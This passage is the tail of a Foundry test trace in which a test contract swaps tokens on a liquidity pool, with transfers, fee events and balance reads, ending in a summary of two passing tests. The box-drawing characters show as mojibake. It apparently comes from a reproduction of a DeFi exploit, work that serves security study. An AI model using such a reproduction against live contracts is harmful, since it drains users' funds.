    в”‚   в”‚   в”њв”Ђ [11094] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::transfer(0xC1CaB7d0a55eB192A077981864938f773Ef398Fc, 446568636 [4.465e8])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, to: 0xC1CaB7d0a55eB192A077981864938f773Ef398Fc, value: 446568636 [4.465e8])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ emit Fees(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 446568636 [4.465e8], param2: 0)
    в”‚   в”‚   в”њв”Ђ [784] 0xF1046053aa5682b4F9a81b5481394DA16BE5FF5a::getFee(0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, false) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000064
    в”‚   в”‚   в”њв”Ђ [7894] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::transfer(0xC1CaB7d0a55eB192A077981864938f773Ef398Fc, 354691509652530498644504 [3.546e23])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, to: 0xC1CaB7d0a55eB192A077981864938f773Ef398Fc, value: 354691509652530498644504 [3.546e23])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ emit Fees(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0, param2: 354691509652530498644504 [3.546e23])
    в”‚   в”‚   в”њв”Ђ [585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4423787700368 [4.423e12]
    в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35209795019165327627368318 [3.52e25]
    в”‚   в”‚   в”њв”Ђ emit Sync(: 4423787700368 [4.423e12], : 35209795019165327627368318 [3.52e25])
    в”‚   в”‚   в”њв”Ђ emit Swap(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 44656863632 [4.465e10], param3: 35469150965253049864450448 [3.546e25], param4: 0, param5: 35469150965253049864450449 [3.546e25])
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в””в”Ђ в†ђ [Return] 
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 14.58s (14.05s CPU time)

Ran 2 test suites in 14.99s (14.85s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
